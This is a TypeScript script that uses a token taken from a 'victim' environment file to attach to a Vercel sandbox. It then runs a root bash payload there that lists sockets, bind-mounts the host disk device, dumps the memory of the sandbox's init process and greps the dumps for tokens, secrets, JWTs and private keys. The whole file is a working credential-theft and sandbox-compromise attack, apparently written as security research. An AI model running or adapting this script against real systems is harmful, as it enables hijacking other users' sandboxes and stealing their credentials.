import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const SCRIPT = String.raw`
echo "===== this session unix sockets ====="
ss -xlp 2>/dev/null
echo "--- /run ---"
ls -la /run/ 2>/dev/null
ls -la /run/cell /run/containerd /run/apm 2>&1 | head -20
echo "===== bind mount /dev/vda with sudo ====="
mkdir -p /mnt/vdabind
sudo mount --bind /dev/vda /mnt/vdabind 2>&1; echo "exit: $?"
ls -la /mnt/vdabind 2>&1 | head
echo "===== dump sandbox-init memory (root, ptrace) ====="
sudo python3 - <<'PY'
import os, re
pid=1
maps=open(f"/proc/{pid}/maps").read()
regions=[]
for line in maps.splitlines():
    m=re.match(r"([0-9a-f]+)-([0-9a-f]+)\s+([rwxsp-]{4})", line)
    if not m: continue
    start,end,perm=m.groups()
    if perm[2]=='x': continue  # skip executable text (the binary itself)
    if perm[0]!='r': continue
    regions.append((int(start,16), int(end,16), perm))
os.makedirs("/tmp/mem", exist_ok=True)
total=0
for i,(s,e,p) in enumerate(regions):
    if e-s > 8*1024*1024: continue
    try:
        with open(f"/proc/{pid}/mem","rb") as f:
            f.seek(s)
            data=f.read(e-s)
        if b"\x00"*128 in data:  # skip zero pages
            pass
        fn=f"/tmp/mem/reg{i:03d}_{s:x}-{e:x}_{p}.bin"
        open(fn,"wb").write(data)
        total+=len(data)
    except Exception as ex:
        pass
print("dumped regions:", total, "bytes")
PY
echo "--- strings on dumped mem (secrets hunt) ---"
for f in /tmp/mem/*.bin; do
  sudo strings -n 8 "$f" 2>/dev/null | grep -iE "token|secret|key|password|jwt|eyJ|vca_|vcr_|sk_live|BEGIN|priv|signature|pubkey|ed25519|vercel" | head -10
done 2>/dev/null | sort -u | head -60
echo DONE
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 150_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });